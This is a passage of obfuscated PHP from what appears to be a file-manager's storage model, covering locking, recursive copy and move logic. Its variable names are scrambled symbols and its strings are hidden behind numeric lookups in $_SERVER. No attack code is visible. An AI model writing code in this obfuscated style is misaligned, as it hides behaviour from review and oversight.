array($∫ı‰Ñ…‘[550], $∫ı‰Ñ…‘[551]), $çá˜‘ø¬); $this->_lockParent($µ‰∏ìœù, array($∫ı‰Ñ…‘[551]), $çá˜‘ø¬); $this->_lockEvent($µ‰∏ìœù, array($∫ı‰Ñ…‘[552], $∫ı‰Ñ…‘[553]), $çá˜‘ø¬); $this->_lockCheckEnd($∫ı‰Ñ…‘[549], $µ‰∏ìœù); } public function lockCopyEnd($ª√ﬁ£¶ã) { $Ê√„Äü– =& $_SERVER[Çâä∆◊¡]; if (!$this->allowLock()) { return; } $ü©’§çï = 0; $this->_lockEvent($ª√ﬁ£¶ã, array($Ê√„Äü–[550], $Ê√„Äü–[551]), $ü©’§çï); $this->_lockParent($ª√ﬁ£¶ã, array($Ê√„Äü–[551]), $ü©’§çï); $this->_lockEvent($ª√ﬁ£¶ã, array($Ê√„Äü–[552], $Ê√„Äü–[553]), $ü©’§çï); } public function lockWriteStart($˚≥Ì¸Œ©, $Ö«∏ß≈ﬂ = '') { $ÏΩßë†’ =& $_SERVER[Çâä∆◊¡]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÏΩßë†’[550], $˚≥Ì¸Œ©); $Ÿ¡⁄É∫Ú = 1; $this->_lockKey($ÏΩßë†’[554] . $˚≥Ì¸Œ© . $ÏΩßë†’[10] . $Ö«∏ß≈ﬂ, $Ÿ¡⁄É∫Ú); $this->_lockEvent($˚≥Ì¸Œ©, array($ÏΩßë†’[549], $ÏΩßë†’[551]), $Ÿ¡⁄É∫Ú); $this->_lockParent($˚≥Ì¸Œ©, array($ÏΩßë†’[549], $ÏΩßë†’[551]), $Ÿ¡⁄É∫Ú); $this->_lockCheckEnd($ÏΩßë†’[550], $˚≥Ì¸Œ©); } public function lockWriteEnd($˜Ê˝Å„Í, $¡ø›ãê¶ = '') { $®⁄πø≈í =& $_SERVER[Çâä∆◊¡]; if (!$this->allowLock()) { return; } $åÔÅËÂ„ = 0; $this->_lockKey($®⁄πø≈í[554] . $˜Ê˝Å„Í . $®⁄πø≈í[10] . $¡ø›ãê¶, $åÔÅËÂ„); $this->_lockEvent($˜Ê˝Å„Í, array($®⁄πø≈í[549], $®⁄πø≈í[551]), $åÔÅËÂ„); $this->_lockParent($˜Ê˝Å„Í, array($®⁄πø≈í[549], $®⁄πø≈í[551]), $åÔÅËÂ„); } public function lockMoveStart($úÊàêà´) { $•Ç‚ü†Ä =& $_SERVER[Çâä∆◊¡]; if (!$this->allowLock()) { return; } $this->_lockCheck($•Ç‚ü†Ä[551], $úÊàêà´); $®£ò¯ˆÍ = 1; $this->_lockKey($•Ç‚ü†Ä[555] . $úÊàêà´, $®£ò¯ˆÍ); $this->_lockEvent($úÊàêà´, array($•Ç‚ü†Ä[549], $•Ç‚ü†Ä[550]), $®£ò¯ˆÍ); $this->_lockParent($úÊàêà´, array($•Ç‚ü†Ä[549], $•Ç‚ü†Ä[551]), $®£ò¯ˆÍ); $this->_lockEvent($úÊàêà´, array($•Ç‚ü†Ä[556], $•Ç‚ü†Ä[552], $•Ç‚ü†Ä[553]), $®£ò¯ˆÍ); $this->_lockCheckEnd($•Ç‚ü†Ä[551], $úÊàêà´); } public function lockMoveEnd($ùœ÷ˆŒè) { $ìœõ¯û⁄ =& $_SERVER[Çâä∆◊¡]; if (!$this->allowLock()) { return; } $¥ŒßÅ”Ù = 0; $this->_lockKey($ìœõ¯û⁄[555] . $ùœ÷ˆŒè, $¥ŒßÅ”Ù); $this->_lockEvent($ùœ÷ˆŒè, array($ìœõ¯û⁄[549], $ìœõ¯û⁄[550]), $¥ŒßÅ”Ù); $this->_lockParent($ùœ÷ˆŒè, array($ìœõ¯û⁄[549], $ìœõ¯û⁄[551]), $¥ŒßÅ”Ù); $this->_lockEvent($ùœ÷ˆŒè, array($ìœõ¯û⁄[556], $ìœõ¯û⁄[552], $ìœõ¯û⁄[553]), $¥ŒßÅ”Ù); } private function _lockCheck($ﬁ˜“ÉÅÄ, $˙Óâ˙∫˛) { $ªª£Àü† =& $_SERVER[Çâä∆◊¡]; $˚ƒ™ëÛﬂ = $this->sourceInfo($˙Óâ˙∫˛); $óÓ—◊∏√ = $ﬁ˜“ÉÅÄ . $ªª£Àü†[10] . $˙Óâ˙∫˛; $this->_lockTimeStart[$óÓ—◊∏√] = timeFloat(); if (!is_array($˚ƒ™ëÛﬂ)) { return; } $à˛•“Œ™ = LNG($ªª£Àü†[557]); CacheLock::setErrorMsg($ªª£Àü†[159] . htmlspecialchars($˚ƒ™ëÛﬂ[$ªª£Àü†[32]]) . $ªª£Àü†[536] . $à˛•“Œ™); $this->_lockKey($óÓ—◊∏√, 1); $this->_lockKey($óÓ—◊∏√, 0); $”åö€ÎÛ = array_reverse($this->parentLevelArray($˚ƒ™ëÛﬂ[$ªª£Àü†[521]])); foreach ($”åö€ÎÛ as $¥Õ‡Ãª”) { $óÓ—◊∏√ = $ﬁ˜“ÉÅÄ . $ªª£Àü†[558] . $¥Õ‡Ãª”; if (CacheLock::lockGet($ªª£Àü†[559] . $óÓ—◊∏√)) { $˚ƒ™ëÛﬂ = $this->sourceInfo($¥Õ‡Ãª”); CacheLock::setErrorMsg($ªª£Àü†[159] . htmlspecialchars($˚ƒ™ëÛﬂ[$ªª£Àü†[32]]) . $ªª£Àü†[536] . $à˛•“Œ™); $this->_lockKey($óÓ—◊∏√, 1); $this->_lockKey($óÓ—◊∏√, 0); } } } private function _lockCheckEnd($‹ï«∫ÚÕ, $£ƒ‘¥ÑÑ) { $π‰òùô” =& $_SERVER[Çâä∆◊¡]; $üÇç∫‚Ã = $‹ï«∫ÚÕ . $π‰òùô”[10] . $£ƒ‘¥ÑÑ; CacheLock::setErrorMsg($π‰òùô”[373]); if (!isset($this->_lockTimeStart[$üÇç∫‚Ã])) { return; } $¢üÅÕˆ = timeFloat() - $this->_lockTimeStart[$üÇç∫‚Ã]; unset($this->_lockTimeStart[$üÇç∫‚Ã]); if ($¢üÅÕˆ > 0.5) { unset(self::$cacheSourceInfo[$π‰òùô”[458] . $£ƒ‘¥ÑÑ]); } $≥û◊ÚﬁØ = $this->sourceInfo($£ƒ‘¥ÑÑ); if (!$≥û◊ÚﬁØ) { show_json(LNG($π‰òùô”[106]), !1); } } private function _lockParent($ç„€ùÌ∏, $™ﬁ»¸Ó…, $˝’é»ó˜) { if (!$this->autoLockSet) { return; } $í¿ıÌç˘ = $this->sourceInfo($ç„€ùÌ∏); if (!is_array($í¿ıÌç˘)) { return; } $«˜ûÙ†º = array_reverse($this->parentLevelArray($í¿ıÌç˘[$_SERVER[Çâä∆◊¡][521]])); foreach ($«˜ûÙ†º as $ıç¸˝´È) { $this->_lockEvent($ıç¸˝´È, $™ﬁ»¸Ó…, $˝’é»ó˜); } } private function _lockEvent($´¡â˙ß«, $Ã÷ÔÎä¸, $í¯àºïà) { $¡‘ıÑ©Ô =& $_SERVER[Çâä∆◊¡]; if (!$this->autoLockSet) { return; } foreach ($Ã÷ÔÎä¸ as $Ì∞óıÀ‡) { $ä∂≈ÛúÌ = $Ì∞óıÀ‡ . $¡‘ıÑ©Ô[10] . $´¡â˙ß«; if ($í¯àºïà && CacheLock::lockGet($¡‘ıÑ©Ô[559] . $ä∂≈ÛúÌ)) { continue; } $this->_lockKey($ä∂≈ÛúÌ, $í¯àºïà); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($˝ä≈·ï˚, $¯•¯†´ë = 1) { $ÌÉù≤æ∫ = $_SERVER[Çâä∆◊¡][559] . md5($˝ä≈·ï˚); if ($¯•¯†´ë) { if (isset(self::$_lockItemArr[$ÌÉù≤æ∫])) { return; } self::$_lockItemArr[$ÌÉù≤æ∫] = 1; CacheLock::lock($ÌÉù≤æ∫, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ÌÉù≤æ∫])) { return; } unset(self::$_lockItemArr[$ÌÉù≤æ∫]); CacheLock::unlock($ÌÉù≤æ∫); } } public function isParentOf($Âı—Öç—, $Ø·–∂åá) { $˝ˆô≤˙Ã =& $_SERVER[Çâä∆◊¡]; $®ààÀß· = $this->sourceInfo($Âı—Öç—); $Ø˘ÖêØñ = $this->sourceInfo($Ø·–∂åá); $⁄î¡ùáΩ = $®ààÀß·[$˝ˆô≤˙Ã[521]] . $®ààÀß·[$˝ˆô≤˙Ã[403]] . $˝ˆô≤˙Ã[50]; $ç¬°í˝„ = $Ø˘ÖêØñ[$˝ˆô≤˙Ã[521]] . $Ø˘ÖêØñ[$˝ˆô≤˙Ã[403]] . $˝ˆô≤˙Ã[50]; $¯œ˛¯≈¸ = strpos($ç¬°í˝„, $⁄î¡ùáΩ) === 0; return $¯œ˛¯≈¸; } private $targetIsDelete = 0; public function copy($º÷åµ´œ, $Ûﬂ£äèª, $…ì≠´÷  = REPEAT_REPLACE, $Œ∞ò˚Å‹ = '') { $öèÖÓî„ =& $_SERVER[Çâä∆◊¡]; $Ÿπ÷∏≈¸ = $this->sourceInfo($º÷åµ´œ); $ÌÕ›„“â = $this->sourceInfo($Ûﬂ£äèª); if (!$Ÿπ÷∏≈¸ || !$ÌÕ›„“â || $ÌÕ›„“â[$öèÖÓî„[411]] != $öèÖÓî„[89]) { return !1; } if ($this->isParentOf($º÷åµ´œ, $Ûﬂ£äèª)) { return !1; } $˝¿˚á€ì = $Œ∞ò˚Å‹ ? $Œ∞ò˚Å‹ : $Ÿπ÷∏≈¸[$öèÖÓî„[32]]; $this->lockCopyStart($º÷åµ´œ); $this->lockWriteStart($Ûﬂ£äèª, $˝¿˚á€ì); $Ø∞›íªœ = array($öèÖÓî„[560] => array(), $öèÖÓî„[561] => array(), $öèÖÓî„[562] => array()); $this->targetIsDelete = intval($Ÿπ÷∏≈¸[$öèÖÓî„[431]]); $ª≈€äëÛ = $this->fileNameExistCache($Ûﬂ£äèª, $Ÿπ÷∏≈¸[$öèÖÓî„[32]]); $¸∫ô–˛‚ = $this->_copy($º÷åµ´œ, $Ûﬂ£äèª, $…ì≠´÷ , $Ø∞›íªœ, !0, $Œ∞ò˚Å‹); $this->_childrenListClear(); $this->lockCopyEnd($º÷åµ´œ); $this->lockWriteEnd($Ûﬂ£äèª, $˝¿˚á€ì); if ($Ÿπ÷∏≈¸[$öèÖÓî„[411]] == $öèÖÓî„[89] && $ª≈€äëÛ == $¸∫ô–˛‚) { $this->folderSizeResetChildren($ª≈€äëÛ); } Model($öèÖÓî„[563])->addAll($Ø∞›íªœ[$öèÖÓî„[561]], array(), !0); if ($ª≈€äëÛ != $¸∫ô–˛‚ || $Ÿπ÷∏≈¸[$öèÖÓî„[411]] == $öèÖÓî„[89]) { Model($öèÖÓî„[564])->eventCopy($¸∫ô–˛‚); } $this->saveAll($Ø∞›íªœ[$öèÖÓî„[562]]); Model($öèÖÓî„[192])->linkAdd($Ø∞›íªœ[$öèÖÓî„[560]]); $this->folderSizeReset($Ûﬂ£äèª); $this->updateModifyTime($Ûﬂ£äèª); return $¸∫ô–˛‚; } private function _copy($˘√µ¯ñ, $˝Œ˛ù–Ö, $˛ÿ¯”¥î, &$ÆØœÇÿÚ, $Õ˙ÍﬁÔ, $°«∆˝ø = '') { $ÖöÁŸ¯√ =& $_SERVER[Çâä∆◊¡]; $∂ü‚ ﬂ˛ = $this->sourceInfoCache($˘√µ¯ñ); $¬’ ∑Ÿú = $∂ü‚ ﬂ˛[$ÖöÁŸ¯√[411]] == $ÖöÁŸ¯√[89]; $≠îè˜˘ö = $°«∆˝ø ? $°«∆˝ø : $∂ü‚ ﬂ˛[$ÖöÁŸ¯√[32]]; $«Îôï©Ç = $this->fileNameExistCache($˝Œ˛ù–Ö, $≠îè˜˘ö); if ($Õ˙ÍﬁÔ) { $this->_childrenAllMake($˘√µ¯ñ); if ($¬’ ∑Ÿú && $«Îôï©Ç) { $this->_childrenAllMake($«Îôï©Ç); } } if (!$«Îôï©Ç) { return $this->_copyCreate($˘√µ¯ñ, $˝Œ˛ù–Ö, $≠îè˜˘ö, $ÆØœÇÿÚ); } $Ñ¨óŸ¶≥ = $«Îôï©Ç; if ($¬’ ∑Ÿú) { if ($˛ÿ¯”¥î == REPEAT_RENAME_FOLDER) { $≠îè˜˘ö = $this->fileNameAutoCache($˝Œ˛ù–Ö, $≠îè˜˘ö, $˛ÿ¯”¥î, $¬’ ∑Ÿú); $Ñ¨óŸ¶≥ = $this->_copyCreate($˘√µ¯ñ, $˝Œ˛ù–Ö, $≠îè˜˘ö, $ÆØœÇÿÚ); } else { $Ø¬ÛÂ˚ƒ = $this->_childrenList($˘√µ¯ñ); foreach ($Ø¬ÛÂ˚ƒ as $÷⁄¥Ñ¨Ö) { $this->_copy($÷⁄¥Ñ¨Ö[$ÖöÁŸ¯√[403]], $«Îôï©Ç, $˛ÿ¯”¥î, $ÆØœÇÿÚ, !1); } } } else { if ($˛ÿ¯”¥î == REPEAT_RENAME || $˛ÿ¯”¥î == REPEAT_RENAME_FOLDER) { $≠îè˜˘ö = $this->fileNameAutoCache($˝Œ˛ù–Ö, $≠îè˜˘ö, $˛ÿ¯”¥î, $¬’ ∑Ÿú); $Ñ¨óŸ¶≥ = $this->_copyCreate($˘√µ¯ñ, $˝Œ˛ù–Ö, $≠îè˜˘ö, $ÆØœÇÿÚ); } else { if ($˛ÿ¯”¥î == REPEAT_REPLACE) { $ΩÇÇµú≥ = $this->sourceInfoCache($«Îôï©Ç); $„œ÷ó¡É = $this->fileHistory($ΩÇÇµú≥, $∂ü‚ ﬂ˛[$ÖöÁŸ¯√[467]], $∂ü‚ ﬂ˛[$ÖöÁŸ¯√[80]]); if ($„œ÷ó¡É) { $ÆØœÇÿÚ[$ÖöÁŸ¯√[560]][] = $∂ü‚ ﬂ˛[$ÖöÁŸ¯√[467]]; } } else { if ($˛ÿ¯”¥î == REPEAT_SKIP) { } } } Hook::trigger($ÖöÁŸ¯√[565], array($ÖöÁŸ¯√[566], $∂ü‚ ﬂ˛, 0)); } return $Ñ¨óŸ¶≥; } private function _copyCreate($ÌÙ≈ï∆ó, $∆ÈûÏ¿ï, $¨úóÌØ´, &$â∫ÊÓ¯„) { $‡È˛®ô£ =& $_SERVER[Çâä∆◊¡]; $ãüöÊÀ˜ = $this->sourceInfoCache($ÌÙ≈ï∆ó); $·…‹ÿŸ = $this->sourceInfoCache($∆ÈûÏ¿ï); $Ë◊Ä’ïô = $this->_makeItemData($ãüöÊÀ˜, $·…‹ÿŸ, $¨úóÌØ´); Hook::trigger($‡È˛®ô£[567], $Ë◊Ä’ïô); Hook::trigger($‡È˛®ô£[568], array($‡È˛®ô£[569], $Ë◊Ä’ïô, 0)); $ŒΩ¯Á≥≠ = $this->add($Ë◊Ä’ïô); $˚ßµ∆∆ = array($‡È˛®ô£[403] => $ŒΩ¯Á≥≠, $‡È˛®ô£[32] => $¨úóÌØ´); $this->_copyApplyMeta($˚ßµ∆∆, $â∫ÊÓ¯„); if ($ãüöÊÀ˜[$‡È˛®ô£[411]] != $‡È˛®ô£[89]) { $â∫ÊÓ¯„[$‡È˛®ô£[560]][] = $ãüöÊÀ˜[$‡È˛®ô£[467]]; return $ŒΩ¯Á≥≠; } $Ó√Ò¥‰Ó = array(); $√≠˘êà’ = array(); $this->_childrenListAll($ÌÙ≈ï∆ó, $Ó√Ò¥‰Ó); $ÿÃÑ‹ø∂ = count($Ó√Ò¥‰Ó); if ($ÿÃÑ‹ø∂ == 0) { return $ŒΩ¯Á≥≠; } $◊Œ‘ñ≈ = $this->sourceInfo($ŒΩ¯Á≥≠); foreach ($Ó√Ò¥‰Ó as $˚›÷Ú¡å) { $¿ ·Èﬂ˚ = $this->_makeItemData($˚›÷Ú¡å, $◊Œ‘ñ≈, $˚›÷Ú¡å[$‡È˛®ô£[32]]); $¿ ·Èﬂ˚[$‡È˛®ô£[521]] = $˚›÷Ú¡å[$‡È˛®ô£[521]]; $√≠˘êà’[] = $¿ ·Èﬂ˚; } $this->chunkEventSet($‡È˛®ô£[570], array($‡È˛®ô£[571], $Ë◊Ä’ïô, $ÿÃÑ‹ø∂)); $this->addAll($√≠˘êà’, array(), !1); $¨©˜ã∫ﬂ = $this->where(array($‡È˛®ô£[498] => $ŒΩ¯Á≥≠))->select(); $∫ˆå¨µñ = $this->_childrenMakeRelation($Ó√Ò¥‰Ó, $¨©˜ã∫ﬂ); $∫ˆå¨µñ[$ÌÙ≈ï∆ó] = $ŒΩ¯Á≥≠; $Ö·£–® = array(); $¿ Ù·Âø = array(); foreach ($¨©˜ã∫ﬂ as $˚›÷Ú¡å) { $∞ŒˆíÜ© = $˚›÷Ú¡å[$‡È˛®ô£[403]]; $ﬂÀ⁄øüÙ = $this->_childrenMatch($∫ˆå¨µñ, $˚›÷Ú¡å, $◊Œ‘ñ≈); $Ö·£–®[] = array($‡È˛®ô£[403], $∞ŒˆíÜ©, $‡È˛®ô£[498], $ﬂÀ⁄øüÙ[$‡È˛®ô£[498]]); $¿ Ù·Âø[] = array($‡È˛®ô£[403], $∞ŒˆíÜ©, $‡È˛®ô£[521], $ﬂÀ⁄øüÙ[$‡È˛®ô£[521]]); $this->_copyApplyMeta($˚›÷Ú¡å, $â∫ÊÓ¯„); if ($˚›÷Ú¡å[$‡È˛®ô£[411]] != $‡È˛®ô£[89]) { $â∫ÊÓ¯„[$‡È˛®ô£[560]][] = $˚›÷Ú¡å[$‡È˛®ô£[467]]; } } $this->chunkEventSet($‡È˛®ô£[572], array($‡È˛®ô£[573], $Ë◊Ä’ïô, $ÿÃÑ‹ø∂)); $this->saveAll($Ö·£–®); $this->chunkEventSet($‡È˛®ô£[574], array($‡È˛®ô£[575], $Ë◊Ä’ïô, $ÿÃÑ‹ø∂)); $this->saveAll($¿ Ù·Âø); return $ŒΩ¯Á≥≠; } private function _childrenMakeRelation($∆˝µÜØ˙, $£ÒÓı©Ò) { $˛Û•¯¶Í =& $_SERVER[Çâä∆◊¡]; $¨îò¥ôπ = array(); $‹≤õà∏œ = array(); foreach ($∆˝µÜØ˙ as $¿√Ãºçµ) { $á€Öãàê = $¿√Ãºçµ[$˛Û•¯¶Í[32]] . $˛Û•¯¶Í[8] . $¿√Ãºçµ[$˛Û•¯¶Í[521]]; $¨îò¥ôπ[$á€Öãàê] = $¿√Ãºçµ[$˛Û•¯¶Í[403]]; } foreach ($£ÒÓı©Ò as $¿√Ãºçµ) { $á€Öãàê = $¿√Ãºçµ[$˛Û•¯¶Í[32]] . $˛Û•¯¶Í[8] . $¿√Ãºçµ[$˛Û•¯¶Í[521]]; $Õ∏ÌÁ”’ = $¨îò¥ôπ[$á€Öãàê]; $‹≤õà∏œ[$Õ∏ÌÁ”’] = $¿√Ãºçµ[$˛Û•¯¶Í[403]]; } return $‹≤õà∏œ; } private function _childrenMatch($üÂ«œú», $õ∫Â®ƒπ, $‡ﬁÔ˝Í‹) { $éœ∞Ëπ• =& $_SERVER[Çâä∆◊¡]; $ø€ò¨öÁ = $‡ﬁÔ˝Í‹[$éœ∞Ëπ•[521]]; $Œ°˜°íá = $this->parentLevelArray($õ∫Â®ƒπ[$éœ∞Ëπ•[521]]); foreach ($Œ°˜°íá as $Î¬ﬂáÓû) { if (isset($üÂ«œú»[$Î¬ﬂáÓû])) { $ø€ò¨öÁ .= $üÂ«œú»[$Î¬ﬂáÓû] . $éœ∞Ëπ•[576]; } } $ø€ò¨öÁ = rtrim($ø€ò¨öÁ, $éœ∞Ëπ•[50]) . $éœ∞Ëπ•[50]; $ë˚Ç›˙´ = $this->parentLevelArray($ø€ò¨öÁ); $åüÜæÇì = $ë˚Ç›˙´[count($ë˚Ç›˙´) - 1]; return array($éœ∞Ëπ•[498] => $åüÜæÇì, $éœ∞Ëπ•[521] => $ø€ò¨öÁ); } private function _makeItemData($Ë≈Ã•ò•, $®æóµ∏‘, $Â††àËù) { $‘†Ñ®¯¢ =& $_SERVER[Çâä∆◊¡]; $Ÿ«—ÂªÆ = array($‘†Ñ®¯¢[577] => $Ë≈Ã•ò•[$‘†Ñ®¯¢[411]], $‘†Ñ®¯¢[421] => $Â††àËù, $‘†Ñ®¯¢[578] => $Ë≈Ã•ò•[$‘†Ñ®¯¢[413]] ? $Ë≈Ã•ò•[$‘†Ñ®¯¢[413]] : $‘†Ñ®¯¢[12], $‘†Ñ®¯¢[468] => $Ë≈Ã•ò•[$‘†Ñ®¯¢[467]] ? $Ë≈Ã•ò•[$‘†Ñ®¯¢[467]] : 0, $‘†Ñ®¯¢[579] => $Ë≈Ã•ò•[$‘†Ñ®¯¢[80]] ? $Ë≈Ã•ò•[$‘†Ñ®¯¢[80]] : 0, $‘†Ñ®¯¢[580] => intval($®æóµ∏‘[$‘†Ñ®¯¢[412]]), $‘†Ñ®¯¢[581] => intval($®æóµ∏‘[$‘†Ñ®¯¢[504]]), $‘†Ñ®¯¢[582] => intval(USER_ID), $‘†Ñ®¯¢[583] => intval(USER_ID), $‘†Ñ®¯¢[402] => intval($®æóµ∏‘[$‘†Ñ®¯¢[403]]), $‘†Ñ®¯¢[584] => $®æóµ∏‘[$‘†Ñ®¯¢[521]] . $®æóµ∏‘[$‘†Ñ®¯¢[403]] . $‘†Ñ®¯¢[50], $‘†Ñ®¯¢[425] => $Ë≈Ã•ò•[$‘†Ñ®¯¢[86]] ? $Ë≈Ã•ò•[$‘†Ñ®¯¢[86]] : time(), $‘†Ñ®¯¢[430] => 0, $‘†Ñ®¯¢[585] => $‘†Ñ®¯¢[12]); return $Ÿ«—ÂªÆ; } private function _copyApplyMeta($‘∂·ë˝Â, &$Àé’Ü÷ñ) { $⁄ô¢Ï˜≥ =& $_SERVER[Çâä∆◊¡]; $∂ËÀÿﬁ® = $‘∂·ë˝Â[$⁄ô¢Ï˜≥[403]]; $÷œïŸöï = $‘∂·ë˝Â[$⁄ô¢Ï˜≥[32]]; if (!isset($‘∂·ë˝Â[$⁄ô¢Ï˜≥[586]]) || !$‘∂·ë˝Â[$⁄ô¢Ï˜≥[586]] || $‘∂·ë˝Â[$⁄ô¢Ï˜≥[586]] == $⁄ô¢Ï˜≥[190]) { $Àé’Ü÷ñ[$⁄ô¢Ï˜≥[562]][] = array($⁄ô¢Ï˜≥[403], $∂ËÀÿﬁ®, $⁄ô¢Ï˜≥[586], short_id($∂ËÀÿﬁ®)); } if (Input::check($÷œïŸöï, $⁄ô¢Ï˜≥[587])) { $Àé’Ü÷ñ[$⁄ô¢Ï˜≥[561]][] = array($⁄ô¢Ï˜≥[403] => $∂ËÀÿﬁ®, $⁄ô¢Ï˜≥[95] => $⁄ô¢Ï˜≥[464], $⁄ô¢Ï˜≥[369] => str_replace($⁄ô¢Ï˜≥[53], $⁄ô¢Ï˜≥[12], Pinyin::get($÷œïŸöï))); $Àé’Ü÷ñ[$⁄ô¢Ï˜≥[561]][] = array($⁄ô¢Ï˜≥[403] => $∂ËÀÿﬁ®, $⁄ô¢Ï˜≥[95] => $⁄ô¢Ï˜≥[463], $⁄ô¢Ï˜≥[369] => Pinyin::get($÷œïŸöï, $⁄ô¢Ï˜≥[588])); } $Àé’Ü÷ñ[$⁄ô¢Ï˜≥[561]][] = array($⁄ô¢Ï˜≥[403] => $∂ËÀÿﬁ®, $⁄ô¢Ï˜≥[95] => $⁄ô¢Ï˜≥[442], $⁄ô¢Ï˜≥[369] => KodSort::makeStr($÷œïŸöï)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($≤ª£î®ˆ) { $¥‡ÙÊ÷∞ =& $_SERVER[Çâä∆◊¡]; $ø≈Íá®ò = $this->sourceInfo($≤ª£î®ˆ); $âó·¯·í = $¥‡ÙÊ÷∞[589]; $«—ß’ªÌ = array($¥‡ÙÊ÷∞[521] => array($¥‡ÙÊ÷∞[544], $ø≈Íá®ò[$¥‡ÙÊ÷∞[521]] . $≤ª£î®ˆ . $¥‡ÙÊ÷∞[545]), $¥‡ÙÊ÷∞[431] => $this->targetIsDelete); $Æ—úôÁ˝ = $this->field($âó·¯·í)->where($«—ß’ªÌ)->select(); if (!$Æ—úôÁ˝) { return; } $Æ—úôÁ˝ = array_to_keyvalue($Æ—úôÁ˝, $¥‡ÙÊ÷∞[403]); foreach ($Æ—úôÁ˝ as $›˝õ¥◊≥) { $èÒË⁄ùé = $›˝õ¥◊≥[$¥‡ÙÊ÷∞[498]]; $≤ª£î®ˆ = $›˝õ¥◊≥[$¥‡ÙÊ÷∞[403]]; if (!isset($this->_childrenListCache[$≤ª£î®ˆ]) && $›˝õ¥◊≥[$¥‡ÙÊ÷∞[411]] == $¥‡ÙÊ÷∞[89]) { $this->_childrenListCache[$≤ª£î®ˆ] = array(); } if (!isset($this->_childrenListCache[$èÒË⁄ùé])) { $this->_childrenListCache[$èÒË⁄ùé] = array(); } $this->_childrenListCache[$èÒË⁄ùé][$≤ª£î®ˆ] = $›˝õ¥◊≥; $this->_childrenItemCache[$≤ª£î®ˆ] = $›˝õ¥◊≥; } } private function _childrenListAll($èãúÑŸ, &$è«áÌ›ñ) { $”∑ﬁÄòà =& $_SERVER[Çâä∆◊¡]; if (!isset($this->_childrenListCache[$èãúÑŸ])) { return; } $«¡±ÀÖ = $this->_childrenListCache[$èãúÑŸ]; foreach ($«¡±ÀÖ as $èº°óΩ§ => $ÁΩÃÔ≠£) { $è«áÌ›ñ[$èº°óΩ§] = $ÁΩÃÔ≠£; if ($ÁΩÃÔ≠£[$”∑ﬁÄòà[411]] == $”∑ﬁÄòà[89]) { $this->_childrenListAll($èº°óΩ§, $è«áÌ›ñ); } } } private function sourceInfoCache($ó…¿˙Àä) { if (isset($this->_childrenItemCache[$ó…¿˙Àä])) { return $this->_childrenItemCache[$ó…¿˙Àä]; } return $this->sourceInfo($ó…¿˙Àä); } private function _childrenList($ƒø‹ÅΩ„) { if (isset($this->_childrenListCache[$ƒø‹ÅΩ„])) { return $this->_childrenListCache[$ƒø‹ÅΩ„]; } return $this->_childrenListSelect($ƒø‹ÅΩ„); } private function _childrenListSelect($∂©≈÷œ¢) { $ëóøÖ—√ =& $_SERVER[Çâä∆◊¡]; $∞˘û˘Ö… = array($ëóøÖ—√[498] => $∂©≈÷œ¢, $ëóøÖ—√[431] => $this->targetIsDelete); $ÓÿÃÅ©ò = $this->where($∞˘û˘Ö…)->select(); $ÓÿÃÅ©ò = $ÓÿÃÅ©ò ? $ÓÿÃÅ©ò : array(); $ê‰≈à¸â = array_to_keyvalue($ÓÿÃÅ©ò, $ëóøÖ—√[403]); $this->_childrenListCache[$∂©≈÷œ¢] = $ê‰≈à¸â; foreach ($ê‰≈à¸â as $∂©≈÷œ¢ => $òî¡…¨¯) { $this->_childrenItemCache[$∂©≈÷œ¢] = $òî¡…¨¯; } return $ê‰≈à¸â; } private function fileNameExistCache($ıŒ–ÊÚ≥, $ã† Ã») { $ˆç¶∞˝è =& $_SERVER[Çâä∆◊¡]; $ã† Ã» = strtolower($ã† Ã»); $›ﬂ◊˛æ‚ = $this->_childrenList($ıŒ–ÊÚ≥); foreach ($›ﬂ◊˛æ‚ as $Øôæ«êÓ) { if ($ã† Ã» == strtolower($Øôæ«êÓ[$ˆç¶∞˝è[32]])) { return $Øôæ«êÓ[$ˆç¶∞˝è[403]]; } } return !1; } private function fileNameAutoCache($ÈÁ˜Õ˚ô, $…óë‚ÿÜ, $Ì–ØÖÄÚ, $«ÖÑÏÊ“) { $ëã¿¨–Î =& $_SERVER[Çâä∆◊¡]; $ƒ∞ÀÛƒ° = $this->_childrenList($ÈÁ˜Õ˚ô); $¨˘È™¥ù = array_to_keyvalue($ƒ∞ÀÛƒ°, $ëã¿¨–Î[12], $ëã¿¨–Î[32]); return $this->fileNameAutoGet($¨˘È™¥ù, $…óë‚ÿÜ, $Ì–ØÖÄÚ, $«ÖÑÏÊ“); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Ÿ ˙ñîÕ, $˜„¯ƒ…Ω, $π™™Ì”ñ = REPEAT_REPLACE, $Òâ∂◊ﬂ· = '') { $¨±Ω—ö™ =& $_SERVER[Çâä∆◊¡]; $ô›ÈıÍÔ = $this->sourceInfo($Ÿ ˙ñîÕ); $Ÿô˚√π¢ = $this->sourceInfo($˜„¯ƒ…Ω); if ($ô›ÈıÍÔ[$¨±Ω—ö™[498]] == $Ÿô˚√π¢[$¨±Ω—ö™[403]]) { if ($ô›ÈıÍÔ[$¨±Ω—ö™[431]] == $¨±Ω—ö™[89]) { Model($¨±Ω—ö™[429])->restore(array($Ÿ ˙ñîÕ)); } if (!$Òâ∂◊ﬂ· || $Òâ∂◊ﬂ· == $ô›ÈıÍÔ[$¨±Ω—ö™[32]]) { return $Ÿ ˙ñîÕ; } } $¸ü¿æí¸ = $this->pathInfoMore($Ÿ ˙ñîÕ); if ($this->isParentOf($Ÿ ˙ñîÕ, $˜„¯ƒ…Ω)) { return !1; } if (!$ô›ÈıÍÔ || !$Ÿô˚√π¢ || $Ÿô˚√π¢[$¨±Ω—ö™[411]] != $¨±Ω—ö™[89]) { return !1; } Hook::trigger($¨±Ω—ö™[590], $¸ü¿æí¸); $this->targetIsDelete = intval($ô›ÈıÍÔ[$¨±Ω—ö™[431]]); if ($ô›ÈıÍÔ[$¨±Ω—ö™[498]] == $˜„¯ƒ…Ω && $Òâ∂◊ﬂ· != $ô›ÈıÍÔ[$¨±Ω—ö™[32]]) { $â„˙ËﬂÀ = $this->fileNameExist($˜„¯ƒ…Ω, $Òâ∂◊ﬂ·); if ($â„˙ËﬂÀ && $ô›ÈıÍÔ[$¨±Ω—ö™[411]] == $¨±Ω—ö™[190]) { $¸ÄÈ¶ó˛ = $this->sourceInfo($â„˙ËﬂÀ); $Ë¥Ìúé¸ = 